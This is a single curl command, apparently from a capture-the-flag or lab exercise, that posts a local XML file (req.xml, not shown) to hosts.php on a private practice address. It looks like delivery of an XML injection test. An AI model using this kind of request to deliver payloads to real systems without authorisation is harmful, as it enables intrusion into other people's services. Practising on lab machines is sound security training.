curl -i -XPOST --url 10.10.10.78/hosts.php \
	-H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0" \
 	-H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
	-H "Accept-Language: en-US,en;q=0.5" \
	-H "Content-Type: application/xml" \
	-H "Upgrade-Insecure-Requests: 1" \
	-H "Connection: close" \
	-d @req.xml

# localhost \ 
